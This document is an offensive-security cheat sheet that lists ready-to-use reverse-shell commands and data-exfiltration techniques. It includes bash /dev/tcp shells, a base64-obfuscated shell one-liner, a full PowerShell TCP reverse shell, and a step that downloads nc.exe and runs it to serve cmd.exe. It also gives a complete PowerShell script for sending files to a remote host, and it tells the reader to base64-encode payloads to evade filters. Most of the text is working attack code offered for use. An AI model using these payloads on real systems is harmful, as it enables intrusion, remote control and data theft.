# Data Exchange

## Rev shells

- [pwncat-cs](https://github.com/calebstewart/pwncat)
- [revshell builder](https://www.revshells.com/)

- Always base64encode if possible

```bash
# listen
socat TCP-LISTEN:9595 STDOUT

### BASH
# general (&> for STDOUT+STDERR redirection; 0>&1 for duplicate STDIN from STDOUT)
### IP FILE DESCRIPTOR WILL NOT WORK WITHOUT bash -c WRAPPER
bash -c 'bash -i &> /dev/tcp/$LHOST/$LPORT 0>&1'    # bash -c 'bash -i >& /dev/tcp/10.10.16.51/9595 0>&1'

# base64 (allows the absence of quotes) (MAY NOT WORK IF TESTED FROM A SHELL, BUT SHOULD WORK WITHIN PROCESSORS LIKE JAVA's runtime.exec())
bash -c {echo,$BASE64_ENCODED_STRING}|{base64,-d}|{bash,-i}
# base64
bash -c 'echo $BASE64_ENCODED_STRING|base64 -d|bash -i'
echo $BASE64_ENCODED_STRING|base64 -d|bash -i

# use this one for raw command execution
echo YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIzLzk1OTUgMD4mMSIK | base64 -d | bash

```

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
powershell -EncodedCommand $REGULAR_BASE64_ENCODED_PAYLOADED_CAN_BE_WITHOUT_QUOTES
powershell -e $SAME_AS_ABOVE

# with nc
curl $IP:$PORT/$PATH -o nc.exe
nc.exe $LHOST $LPORT -e cmd.exe
```

## exfil

```bash
### BASE64 (if the target machine has base64)
# base64 encode the file and decode it on target machine
cat $FILE | base64 --wrap=0          # to one-line encode
echo -n $B64STRING | base64 --decode # echo without newline

echo -ne $HEX_STRING > $FILE         # interpret /xHH characters as hex

cat > $FILENAME << EOF
I am string 1
I am string 2
EOF


### send via bash redirection (receive via `socat TCP-LISTEN:9595 STDOUT`)
bash -c 'cat example.txt | base64 -w 0 &> /dev/tcp/RHOST/RPORT'
socat TCP-LISTEN:9595,reuseaddr,fork OPEN:database.db,creat,append
cat database.db | base64 --decode | tee -a database.db.decoded
```

Note that executing raw-sent files can fail easily because of .so version mismatch. If transfering raw executables to unix boxes make sure to compile for the correct GLIBC version.

### Exfil from win

```bash
# host
impacket-smbserver -smb2support coolshare ./

# windows
cp ./winpeas.out \\10.10.16.5\coolshare\
```

### Sending data via pwsh

pwsh >= 5:

```powershell
$b = New-PSSession B
Copy-Item -FromSession $b C:\Programs\temp\test.txt -Destination C:\Programs\temp\test.txt
```

pwsh == *:

```ps1
# USAGE:
# # CLIENT-SIDE
# send_file_tcp.ps1 -filePath 'C:\example.txt -server "192.168.68.1" -port 9595
#
# SERVER-SIDE:
# socat TCP-LISTEN:9595,reuseaddr,fork OPEN:example.txt.b64,creat,append 
# cat example.txt.b64|base64 --decode|tee -a example.txt

param(
    [string]$filePath,
    [string]$server,
    [int]$port
)

# Validate if file exists
if (-Not (Test-Path -Path $filePath)) {
    Write-Host "The specified file does not exist: $filePath"
    exit
}

# Read the content of the file as bytes
$fileBytes = Get-Content -Path $filePath -Encoding Byte -ReadCount 0

# Encode the file content to Base64
$base64Content = [Convert]::ToBase64String($fileBytes)

# Create the TCP client to connect to the remote server
$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Connect($server, $port)

# Get the network stream for sending data
$networkStream = $tcpClient.GetStream()

# Convert the Base64 content to a byte array
$base64Bytes = [System.Text.Encoding]::ASCII.GetBytes($base64Content)

# Send the Base64 encoded content over the network stream
$networkStream.Write($base64Bytes, 0, $base64Bytes.Length)

# Close the network stream and the TCP client
$networkStream.Close()
$tcpClient.Close()

Write-Host "File sent successfully to ${server}:${port}!"
```
